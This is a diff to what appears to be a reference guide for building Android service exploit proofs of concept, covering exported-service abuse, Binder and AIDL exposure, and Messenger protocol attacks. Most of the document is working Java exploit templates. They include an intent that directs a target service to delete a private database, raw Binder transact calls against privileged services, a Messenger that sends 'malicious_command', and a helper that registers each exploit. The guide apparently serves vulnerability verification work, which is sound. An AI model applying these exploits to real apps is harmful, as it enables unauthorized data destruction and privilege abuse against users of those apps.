@@ -7,6 +7,15 @@ description: Service PoC reference covering AIDL exposure, Messenger abuse, Inte
 
 Use this reference for exported or otherwise attacker-reachable Android services. Service PoCs usually fit either `direct-trigger` or `binder-caller` mode.
 
+## Template Wiring
+
+These snippets show the exploit body shape. In the current template:
+
+- keep start, bind, or Messenger setup in a helper method
+- register one exploit id in `ExploitRegistry`
+- prefer one reusable connection or Binder helper over one-off PoC classes
+- add interface wrappers only when the compile path truly needs them
+
 ## Construction Matrix
 
 | Vulnerability | Exploit mode | Typical support | Visible success |
@@ -19,34 +28,33 @@ Use this reference for exported or otherwise attacker-reachable Android services
 
 ## Shared Inputs
 
-Collect these fields before coding:
-
 - victim service class
 - exported or bindable status
-- required action, extras, or message codes
-- Binder interface name, Stub class, or `what`/`arg1`/`obj` protocol
+- required action, component name, extras, or message codes
+- Binder descriptor, transact code, or `what`/`arg1`/`obj` protocol
 - visible success signal
 
 ## Pattern 1 - Start-Service Trigger
 
-Use for `ServiceIntentInjectExploit`.
+Use for `onStartCommand()`-driven abuse.
 
 ```java
-public final class ServiceIntentInjectExploit extends Exploit {
-    public ServiceIntentInjectExploit(Context context) {
-        super(context);
-    }
+private static void runServiceIntentInject(Context context) {
+    Intent intent = new Intent();
+    intent.setClassName("com.target", "com.target.CommandService");
+    intent.setAction("com.target.EXECUTE_COMMAND");
+    intent.putExtra("command", "delete");
+    intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
+    context.startService(intent);
+    Log.i("PoC", "Sent startService() trigger to com.target.CommandService");
+}
+```
 
-    @Override
-    public void execute() {
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.CommandService");
-        intent.setAction("com.target.EXECUTE_COMMAND");
-        intent.putExtra("command", "delete");
-        intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
-        context.startService(intent);
-        log("Sent startService() trigger to com.target.CommandService");
-    }
+Registration shape:
+
+```java
+static {
+    register("service-start", "Start Exported Service", () -> runServiceIntentInject(appContext));
 }
 ```
 
@@ -55,128 +63,159 @@ Use when:
 - the service reads attacker-controlled extras or action strings from `onStartCommand()`
 - no non-bypassable permission check blocks the launch
 
-Do not use when:
+## Pattern 2 - Single-Step Bind And Binder Transaction
 
-- the service path only exists behind a Binder interface
-
-## Pattern 2 - Direct Bind with Binder Handle
-
-Use for `ServiceAidlExposeExploit` or `ServiceBindEscalationExploit`.
+Use for exported AIDL or Binder exposure.
 
 ```java
-public final class ServiceAidlExposeExploit extends Exploit {
-    public ServiceAidlExposeExploit(Context context) {
-        super(context);
-    }
+private static void runServiceBinderTransact(
+    Context context,
+    String packageName,
+    String serviceClass,
+    String interfaceDescriptor,
+    int transactCode
+) {
+    Intent intent = new Intent();
+    intent.setClassName(packageName, serviceClass);
 
-    @Override
-    public void execute() {
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.VulnService");
-        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
-    }
-
-    private final ServiceConnection connection = new ServiceConnection() {
+    ServiceConnection connection = new ServiceConnection() {
         @Override
-        public void onServiceConnected(ComponentName name, IBinder binder) {
-            log("Bound to com.target.VulnService");
-            // Replace with the real reconstructed interface:
-            // ITargetService service = ITargetService.Stub.asInterface(binder);
-            // String data = service.getSensitiveData();
-            // log("Leaked data: " + data);
-        }
-
-        @Override
-        public void onServiceDisconnected(ComponentName name) {}
-    };
-}
-```
-
-Use when:
-
-- the exported service returns a Binder to external callers
-- the vuln report already identified a reachable privileged Binder method
-
-Manifest support:
-
-- usually none
-- only recreate `.aidl` or Binder wrapper classes if the compile path requires them
-
-Success signal:
-
-- returned protected data
-- accepted privileged operation
-
-## Pattern 3 - Messenger Protocol Caller
-
-Use for `ServiceMessengerAbuseExploit`.
-
-```java
-public final class ServiceMessengerAbuseExploit extends Exploit {
-    public ServiceMessengerAbuseExploit(Context context) {
-        super(context);
-    }
-
-    @Override
-    public void execute() {
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.MsgService");
-        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
-    }
-
-    private final ServiceConnection connection = new ServiceConnection() {
-        @Override
-        public void onServiceConnected(ComponentName name, IBinder binder) {
+        public void onServiceConnected(ComponentName name, IBinder service) {
+            Parcel input = Parcel.obtain();
+            Parcel output = Parcel.obtain();
             try {
-                Messenger messenger = new Messenger(binder);
-                Message msg = Message.obtain();
-                msg.what = 1;
-                msg.obj = "malicious_command";
-                messenger.send(msg);
-                log("Sent attacker message to Messenger service");
+                input.writeInterfaceToken(interfaceDescriptor);
+                // Write parameters positionally
+                // input.writeString("test")
+                service.transact(transactCode, input, output, 0);
+                Log.i("PoC", "Binder transact finished for code " + transactCode);
             } catch (Exception e) {
-                log("Messenger send failed: " + e.getMessage());
+                Log.e("PoC", "Binder transact failed", e);
+            } finally {
+                input.recycle();
+                output.recycle();
+                context.unbindService(this);
             }
         }
 
         @Override
-        public void onServiceDisconnected(ComponentName name) {}
+        public void onServiceDisconnected(ComponentName name) {
+            Log.i("PoC", "Service disconnected: " + name.flattenToShortString());
+        }
     };
+
+    boolean bound = context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
+    if (!bound) {
+        Log.w("PoC", "bindService() returned false for " + serviceClass);
+    }
 }
 ```
 
+Registration shape:
+
+```java
+static {
+    register("service-transact", "Bind And Call Binder Transaction", () -> {
+        runServiceBinderTransact(
+            appContext,
+            "com.target",
+            "com.target.VulnService",
+            "com.target.IVulnService",
+            3
+        );
+    });
+}
+```
+
+Fill with:
+
+- real package name and service class, or equivalent explicit bind `Intent`
+- real interface descriptor
+- real transact code or verified Stub method mapping
+- exact positional parameters and reply parsing
+
 Use when:
 
-- the service exposes a `Messenger`
-- the message protocol is attacker-controlled and weakly validated
+- the exported service returns a raw Binder to external callers
+- the report already identified a reachable privileged transaction
+- reconstructing full `.aidl` is unnecessary or more fragile than direct `transact(...)`
+
+If a stable `.aidl` interface already exists and compiles cleanly, using it is still acceptable, but keep the PoC focused on one verified method.
+
+If the finding really needs a `bind -> wait -> multiple calls` flow, split connection setup and repeated calls into separate helpers. Default to the single-step shape above.
+
+## Pattern 3 - Messenger Protocol Caller
+
+Use for Messenger-backed service protocols.
+
+```java
+private static final ServiceConnection MESSENGER_CONNECTION = new ServiceConnection() {
+    @Override
+    public void onServiceConnected(ComponentName name, IBinder binder) {
+        try {
+            Messenger messenger = new Messenger(binder);
+            Message msg = Message.obtain();
+            msg.what = 1;
+            msg.obj = "malicious_command";
+            messenger.send(msg);
+            Log.i("PoC", "Sent attacker message to Messenger service");
+        } catch (Exception e) {
+            Log.e("PoC", "Messenger send failed", e);
+        }
+    }
+
+    @Override
+    public void onServiceDisconnected(ComponentName name) {}
+};
+
+private static void runServiceMessengerAbuse(Context context) {
+    Intent intent = new Intent();
+    intent.setClassName("com.target", "com.target.MsgService");
+    context.bindService(intent, MESSENGER_CONNECTION, Context.BIND_AUTO_CREATE);
+}
+```
+
+Registration shape:
+
+```java
+static {
+    register("service-messenger", "Send Messenger Command", () -> runServiceMessengerAbuse(appContext));
+}
+```
 
 Fill with:
 
 - real `what`, `arg1`, `arg2`, `Bundle`, `replyTo`, or `obj` values from the verified finding
 
+Use when:
+
+- the service exposes a `Messenger`
+- the real attack surface is the message protocol rather than raw `transact(...)`
+
 ## Pattern 4 - Foreground-Notification Observation
 
-Use for `ServiceForegroundLeakExploit`.
+Use for notification leakage rather than Binder control.
 
 ```java
-public final class ServiceForegroundLeakExploit extends Exploit {
-    public ServiceForegroundLeakExploit(Context context) {
-        super(context);
-    }
+private static void runForegroundLeak(Context context) {
+    Intent intent = new Intent();
+    intent.setClassName("com.target", "com.target.LeakyForegroundService");
+    context.startService(intent);
+    Log.i("PoC", "Started foreground service. Check whether the notification exposes sensitive text.");
+}
+```
 
-    @Override
-    public void execute() {
-        Intent intent = new Intent();
-        intent.setClassName("com.target", "com.target.LeakyForegroundService");
-        context.startService(intent);
-        log("Started foreground service. Check whether the notification exposes tokens, account data, or other sensitive text.");
-    }
+Registration shape:
+
+```java
+static {
+    register("service-foreground", "Start Foreground Service", () -> runForegroundLeak(appContext));
 }
 ```
 
 Use when:
 
-- the finding is about sensitive notification content rather than a Binder or Intent control path
+- the finding is about visible notification content rather than Binder control or message protocol abuse
 
 Optional support:
 
@@ -184,8 +223,9 @@ Optional support:
 
 ## Construction Notes
 
-- Prefer `direct-trigger` if `startService()` alone demonstrates the bug
-- Prefer `binder-caller` if the real vulnerable path lives behind `onBind()`
-- Do not fake privileged Binder calls if the report never identified a reachable method
-- For AIDL or Binder cases, keep the exploit focused on one verified method, not the entire interface
-- For foreground leaks, the success signal is the visible notification content, not a theoretical background leak
+- prefer `direct-trigger` when `startService()` alone proves the bug
+- prefer `binder-caller` when the real vulnerable path lives behind `onBind()`
+- default to one exploit id that both binds and calls; only split phases when the service contract truly needs it
+- prefer one reusable raw Binder helper over generating large AIDL scaffolding for every target
+- do not fake privileged Binder calls if the report never identified a reachable method or transaction
+- for foreground leaks, the success signal is the visible notification content, not a theoretical background leak
